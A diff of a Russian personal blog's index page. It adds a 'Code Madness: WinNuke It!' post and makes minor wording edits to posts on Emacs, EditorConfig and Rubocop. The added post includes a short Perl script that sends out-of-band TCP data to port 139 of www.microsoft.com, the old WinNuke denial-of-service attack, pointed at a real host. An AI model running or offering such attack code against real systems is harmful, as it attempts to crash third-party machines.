@@ -9,8 +9,9 @@
 	<meta name="author" content="Свиридов Александр">
 
 	
-	<meta name="description" content="01.03.2014 Emacs Emacs: EditorConfig Случайно наткнулся на эту полезную штуку. EditorConfig &ndash; это проект, с помощью которого можно задать &hellip;">
-	
+	<meta name="description" content="Блог Свиридова Александра">
+        
+        <meta name="keywords" content="Alexander Sviridov, Александр Свиридов, Emacs, Ruby, Code Madness, блог">
 
   <!-- http://t.co/dKP3o1e -->
   <meta name="HandheldFriendly" content="True">
@@ -113,6 +114,58 @@
   
 
 
+<time datetime="2014-07-14T14:50:45+06:00" data-updated="true" itemprop="datePublished">14.07.2014</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/code-madness/'>Code Madness</a>, <a class='category' href='/blog/categories/perl/'>Perl</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2014/07/14/code-madness-winnuke-it/" itemprop="url">Code Madness: WinNuke It!</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>Тяжело ли сейчас реализовать <a href="http://en.wikipedia.org/wiki/WinNuke">WinNuke</a> атаку, которая в 1997 положила <a href="http://www.microsoft.com">www.microsoft.com</a> на несколько дней? Вовсе нет:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">use</span> <span class="nn">IO::</span><span class="n">Socket</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nn">IO::Socket::</span><span class="n">INET</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="n">PeerAddr</span> <span class="o">=&gt;</span> <span class="s">&#39;www.microsoft.com&#39;</span><span class="p">,</span> <span class="n">PeerPort</span> <span class="o">=&gt;</span> <span class="mi">139</span><span class="p">,</span> <span class="n">Proto</span> <span class="o">=&gt;</span> <span class="s">&#39;tcp&#39;</span><span class="p">)</span>
+</span><span class='line'>                <span class="o">-&gt;</span><span class="nb">send</span><span class="p">(</span><span class="s">&#39;Bye&#39;</span><span class="p">,</span> <span class="n">MSG_OOB</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+		
+		
+	</div>
+
+</article>
+
+
+    <article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
 <time datetime="2014-03-01T16:04:10+06:00" data-updated="true" itemprop="datePublished">01.03.2014</time></div>
 		<div class="tags">
 
@@ -125,22 +178,16 @@
 	</div>
 	<h1 class="title" itemprop="name"><a href="/blog/2014/03/01/emacs-editorconfig/" itemprop="url">Emacs: EditorConfig</a></h1>
 	<div class="entry-content" itemprop="articleBody">
-		<p>Случайно наткнулся на эту полезную штуку. <a href="http://editorconfig.org/">EditorConfig</a> &ndash; это проект, с помощью которого можно задать основные правила оформления кода в проекте и синхронизовать их между программистами и их редакторами (и IDE). <a href="http://editorconfig.org/">EditorConfig</a> поддерживается <a href="http://editorconfig.org/#download">плагинами</a> для всех популярных редакторов. Установка <a href="http://editorconfig.org/">EditorConfig</a> проста:</p>
+		<p>Случайно наткнулся на эту полезную штуку. <a href="http://editorconfig.org/">EditorConfig</a> &ndash; это инструмент, с помощью которого можно задать основные правила оформления кода в проекте и синхронизировать их между программистами и их редакторами (и IDE). <a href="http://editorconfig.org/">EditorConfig</a> поддерживается <a href="http://editorconfig.org/#download">плагинами</a> для всех популярных редакторов. Установка <a href="http://editorconfig.org/">EditorConfig</a> проста:</p>
 
 <ul>
 <li>Устанавливаем <a href="https://github.com/editorconfig/editorconfig-core-c/blob/master/INSTALL.md">ядро EditorConfig</a></li>
-<li>Устанавливаем <a href="http://editorconfig.org/#download">плагин</a> для редактора. В случае <a href="http://www.gnu.org/software/emacs/">Emacs</a> все просто:</li>
+<li>Устанавливаем <a href="http://editorconfig.org/#download">плагин</a> для редактора. В случае <a href="http://www.gnu.org/software/emacs/">Emacs</a> пакет доступен для загрузки с <a href="http://marmalade-repo.org/packages/editorconfig">Marmalade</a> и установка очень проста:</li>
 </ul>
 
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="c1">;; Устанавливаем пакет через ELPA</span>
-</span><span class='line'><span class="c1">;; Пакет доступен для установки с Marmalade</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">(</span><span class="nv">require-package</span> <span class="ss">&#39;editorconfig</span><span class="p">)</span>
+</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="p">(</span><span class="nv">require-package</span> <span class="ss">&#39;editorconfig</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -179,7 +226,7 @@
 	</div>
 	<h1 class="title" itemprop="name"><a href="/blog/2014/02/22/emacs-dynamic-elisp-highlighting/" itemprop="url">Emacs: динамическая подсветка Elisp-кода</a></h1>
 	<div class="entry-content" itemprop="articleBody">
-		<p>Как ты наверняка знаешь, языком программирования <a href="http://www.gnu.org/software/emacs/">Emacs</a> является <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/index.html#Top">Elisp</a>. Его поддержка в стандартной поставке <a href="http://www.gnu.org/software/emacs/">Emacs</a> достаточно хороша. Но вот чего мне действительно не хватает &ndash; это качественной подсветки символов (идентификаторов), в том числе определяемых мной. Ну что же, давай ее добавим.</p>
+		<p>Как вы наверняка знаете, языком программирования <a href="http://www.gnu.org/software/emacs/">Emacs</a> является <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/index.html#Top">Elisp</a>. Его поддержка в стандартной поставке <a href="http://www.gnu.org/software/emacs/">Emacs</a> достаточно хороша. Но вот чего мне действительно не хватает &ndash; это качественной подсветки символов (идентификаторов), в том числе определяемых мной. Ну что же, давайте ее добавим.</p>
 
 
 		
@@ -215,7 +262,9 @@
 	</div>
 	<h1 class="title" itemprop="name"><a href="/blog/2014/02/21/code-madness-join-to-the-dark-side/" itemprop="url">Code Madness: Join to the Dark Side?</a></h1>
 	<div class="entry-content" itemprop="articleBody">
-		<p>Как заставить человека перейти на Темную сторону? Все просто:</p>
+		<p>Под тегом <a href="/blog/categories/code-madness/">Code Madness</a> буду публиковать различные забавные кусочки кода. С их помощью я постараюсь показать вам интересные маленькие особенности того или иного языка программирования. Итак&hellip;</p>
+
+<p>Как заставить человека перейти на Темную сторону? Все просто:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -259,9 +308,18 @@
 	</div>
 	<h1 class="title" itemprop="name"><a href="/blog/2014/02/20/emacs-ruby-static-code-analysis/" itemprop="url">Emacs: статический анализ Ruby-кода</a></h1>
 	<div class="entry-content" itemprop="articleBody">
-		<p><a href="https://github.com/bbatsov/rubocop">Rubocop</a> &ndash; это полезный инструмент для любого Ruby-разработчика. <a href="https://github.com/bbatsov/rubocop">Rubocop</a> осуществляет статический анализ Ruby-кода основываясь на <a href="https://github.com/bbatsov/ruby-style-guide">Ruby Style Guide</a> и помогает сделать твой код (или код твоих коллег) чуточку читабельнее (а значит и лучше).</p>
+		<p><a href="https://github.com/bbatsov/rubocop">Rubocop</a> &ndash; это полезный инструмент для любого <a href="https://www.ruby-lang.org/ru/">Ruby</a>-разработчика. <a href="https://github.com/bbatsov/rubocop">Rubocop</a> осуществляет статический анализ <a href="https://www.ruby-lang.org/ru/">Ruby</a>-кода основываясь на <a href="https://github.com/bbatsov/ruby-style-guide">Ruby Style Guide</a> и помогает сделать ваш код чуточку читабельнее (а значит и лучше).</p>
 
-<p>Вот только есть один минус &ndash; ручной запуск <a href="https://github.com/bbatsov/rubocop">Rubocop</a> из терминала. Сам понимаешь, хочется интеграции этого чуда в среду разработки, так чтобы оно само. Ну что же, давай заинтегрируем.</p>
+<p>Так как <a href="https://github.com/bbatsov/rubocop">Rubocop</a> является утилитой командной строки, его ручной запуск является не самым удобным в работе решением. Однако, нет ничего сложного в том, чтобы настроить интеграцию <a href="https://github.com/bbatsov/rubocop">Rubocop</a> и <a href="http://www.gnu.org/software/emacs/">Emacs</a>, получив при этом:</p>
+
+<ul>
+<li>Автоматический запуск <a href="https://github.com/bbatsov/rubocop">Rubocop</a> для текущего файла</li>
+<li>Подсветку ошибок и предупреждений прямо в коде</li>
+<li>Возможность получить список всех ошибок с ссылками на те месте, где они обнаружены</li>
+</ul>
+
+
+<p>Ну что же, сделаем это!</p>
 
 
 		
